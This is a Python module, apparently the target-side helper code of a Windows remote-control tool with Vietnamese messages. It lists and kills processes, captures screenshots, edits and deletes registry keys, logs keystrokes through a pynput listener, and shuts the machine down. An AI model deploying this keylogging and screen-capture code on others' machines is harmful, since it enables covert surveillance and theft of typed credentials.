import psutil
from PIL import ImageGrab
import os
from pynput.keyboard import Listener
import subprocess
import winreg
import os

def get_hkey(HKEY_NAME):
    if HKEY_NAME == 'HKEY_LOCAL_MACHINE':
        return winreg.HKEY_LOCAL_MACHINE
    elif HKEY_NAME == 'HKEY_CLASSES_ROOT':
        return winreg.HKEY_CLASSES_ROOT
    elif HKEY_NAME == 'HKEY_CURRENT_USER':
        return winreg.HKEY_CURRENT_USER
    elif HKEY_NAME == 'HKEY_USERS':
        return winreg.HKEY_USERS
    else:
        return winreg.HKEY_CURRENT_CONFIG

def open_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aReg = winreg.ConnectRegistry(None, HKEY)

    aKey = "\\".join(links)

    return winreg.OpenKey(aReg, aKey, 0, winreg.KEY_ALL_ACCESS)


def get_process_running():
    application_running = []

    for proc in psutil.process_iter(['pid', 'name']):
        application_running.append(proc.info)
    print(application_running)
    return application_running


def kill_process_running(pid):
    try:
        p = psutil.Process(pid)
        p.kill()
        return '1'
    except:
        return '0'

def open_process(name):
    DETACHED_PROCESS = 0x00000008

    try:
        subprocess.Popen([f'{name}.exe'], close_fds=True, creationflags=DETACHED_PROCESS)
        return '1'
    except:
        return '0'

def take_screen_shot():
    img = ImageGrab.grab(bbox = None)

    width, height = img.size

    photo_to_send = img.tobytes()
    
    size = len(photo_to_send)
    
    return photo_to_send, size, width, height


def get_value(link, name):
    try:
        asubkey = open_key(link)
        return winreg.QueryValueEx(asubkey, name)[0]
    except Exception as e:
        print(e)
        return "Lỗi"

def delete_value(link, name):
    try:
        asubkey = open_key(link)
        winreg.DeleteValue(asubkey, name)
        return "Xóa value thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def set_value(link, name, value, value_type):
    if value_type == 'String':
        value_type = winreg.REG_SZ
    elif value_type == 'Binary':
        value_type = winreg.REG_BINARY
    elif value_type == 'DWORD':
        value_type = winreg.REG_DWORD
    elif value_type == 'QWORD':
        value_type = winreg.REG_QWORD
    elif value_type == 'Multi-String':
        value_type = winreg.REG_MULTI_SZ
    else:
        value_type = winreg.REG_EXPAND_SZ
    
    try:
        asubkey = open_key(link)

        winreg.SetValueEx(asubkey, name, 0, value_type, value)

        return "Sửa value thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def create_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aKey = "\\".join(links)

    try:
        winreg.CreateKey(HKEY, aKey)
        return "Tạo Key thành công"
    except Exception as e:
        print(e)
        return "Lỗi"

def delete_key(link):
    links = link.split("\\")

    HKEY_NAME = links.pop(0)

    HKEY = get_hkey(HKEY_NAME)

    aKey = "\\".join(links)

    try:
        winreg.DeleteKey(HKEY, aKey)
        return "Xóa Key thành công"
    except Exception as e:
        print(e)
        return "Lỗi"


key_log = ''
listener = None

def on_press(key):
    global key_log
    try:
        key_log += key.char
    except AttributeError:
        pass

def listening_keyboard(listening=True):
    global key_log
    global listener

    if listening:
        listener = Listener(on_press=on_press)
        listener.start()
    else:
        if listener:
            listener.stop()
        key_log = ''

def get_key_log():
    global key_log

    return key_log

def shutdown_pc():
    os.system("shutdown /s /t 1")

def get_application_running():
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    remove_top = 0
    list_app = []
    for line in proc.stdout:
        if not line.decode()[0].isspace():
            remove_top = remove_top + 1
            if remove_top > 2:
                list_app.append({line.decode().rstrip()[:23].replace(' ',''): line.decode().rstrip()[23:].replace(' ','')})
    return list_app
